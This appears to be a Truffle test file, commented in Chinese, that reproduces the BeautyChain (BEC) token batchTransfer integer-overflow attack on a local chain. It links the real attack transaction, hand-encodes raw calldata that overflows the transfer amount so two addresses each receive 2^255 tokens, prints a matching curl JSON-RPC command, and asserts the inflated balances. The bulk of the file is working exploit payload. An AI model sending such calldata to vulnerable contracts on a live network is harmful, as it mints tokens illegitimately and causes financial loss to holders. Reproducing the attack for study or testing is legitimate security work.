var helper = require('../helpers/web3Eth');

var BigNum = require('../helpers/bignumber');

'use strict';

const BigNumber = web3.BigNumber

require('chai')
    .use(require('chai-as-promised'))
    .use(require('chai-bignumber')(BigNumber))
    .should()

var account0 = web3.eth.accounts[0];
var account1 = web3.eth.accounts[1];
var account2 = web3.eth.accounts[2];
var account3 = web3.eth.accounts[3];
var account4 = web3.eth.accounts[4];
var account5 = web3.eth.accounts[5];
var account6 = web3.eth.accounts[6];
var account7 = web3.eth.accounts[7];
var account8 = web3.eth.accounts[8];
var account9 = web3.eth.accounts[9];

var result;

var BecToken = artifacts.require('BecToken.sol');
// var BecToken = artifacts.require('../contracts/BecToken.sol');
// 57896044618658097711785492504343953926634992332820282019728792003956564819968
// @notice 大数的使用方法
// 0x8000000000000000000000000000000000000000000000000000000000000000
let tvl = new BigNumber("57896044618658097711785492504343953926634992332820282019728792003956564819968");
console.log(tvl.toFixed(0))
contract('BecToken', function ([_, owner]) {
    let token;
    let seq = 0;

    beforeEach(async function () {
        token = await BecToken.new({
            from: owner
        });
        seq++;
        console.log(helper.SPACE10, "New contract address:", token.address);
    });

    it('case @ should have correct information', async function () {

        const decimals = await token.decimals();
        const name = await token.name();
        const symbol = await token.symbol();
        const totalSupply = await token.totalSupply();
        decimals.should.be.bignumber.equal(18);
        name.should.equal('BeautyChain');
        totalSupply.should.be.bignumber.equal(7e+27);
    });

    /*
     * @dev 攻击链接：https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f
     */
    it.only(seq + ' case @ batchTransfer attack:', async function () {
        let account = "d4de18319360b51beaa28a7af22728bd8181bd91";
        let at = "d4de18319360b51beaa28a7af22728bd8181bd92";
        let Str0x = "0x";
        let b3 = await token.balanceOf(Str0x + account);
        // console.log(helper.SPACE10, "balance of account (before attack):", b3.toNumber());
        assert.equal(b3.valueOf(), 0, "校验攻击前余额失败");

        console.log(helper.SPACE10, 'Owner:', owner);
        console.log(helper.SPACE10, "攻击地址1", Str0x + account);
        console.log(helper.SPACE10, "攻击地址2", Str0x + at);

        // token.allEvents(helper.callbackEvent);
        let data1 =
            "0x" +
            "83f12fec" +
            "0000000000000000000000000000000000000000000000000000000000000040" +
            "8000000000000000000000000000000000000000000000000000000000000000" +
            // "0000000000000000000000000000000000000000000000000000000000002049" +
            "0000000000000000000000000000000000000000000000000000000000000002" +
            "000000000000000000000000" + account +
            "000000000000000000000000" + at;

        // console.log("bytecode:", data1);
        console.log("Command:", 'curl -H "Content-Type: application/json" --data \'{"jsonrpc":"2.0","id":7,"method":"eth_call","params":[{"from":"' +
            owner + '","value":"0x0","gasPrice":"1","gas":"470000","to":"' + token.address +
            '","data":"' + data1 + '"},"latest"]}\' http://localhost:8545');

        let result = await web3.eth.sendTransaction({
            from: owner,
            gasPrice: 1,
            gas:470000,
            to: token.address,
            data: data1
        });
        console.log(helper.SPACE10, "result:", result);


        b3 = await token.balanceOf(Str0x + account);
        console.log(helper.SPACE10, "balanceOf(", Str0x + account, ")", b3.valueOf());
        assert.equal(b3.valueOf(), 0x8000000000000000000000000000000000000000000000000000000000000000 + 888, "校验攻击后余额失败1");

        b3 = await token.balanceOf(Str0x + at);
        console.log(helper.SPACE10, "balanceOf(", Str0x + at, ")", b3.valueOf());
        assert.equal(b3.valueOf(), 0x8000000000000000000000000000000000000000000000000000000000000000, "校验攻击后余额失败2");

    });

    it.only(seq + ' case @ batchTransfer', async function () {
        // console.log(helper.SPACE10, "batchTransfer：", tvl);
        // token.allEvents(helper.callbackEvent);
        let account = "d4de18319360b51beaa28a7af22728bd8181bd91";
        let Str0x = "0x";
        let b3 = await token.balanceOf(Str0x + account);
        assert.equal(b3.valueOf(), 0, "balance of account3 is error.");
        // Error: VM Exception while processing transaction: revert // 0x800......

        await token.batchTransfer([Str0x + account, Str0x + "d4de18319360b51beaa28a7af22728bd8181bd92"], tvl, {
            from: owner
        });
        b3 = await token.balanceOf(Str0x + account);
        assert.equal(b3.toFixed(0), tvl.toFixed(0), "验证batchTransfer操作失败");
    });
});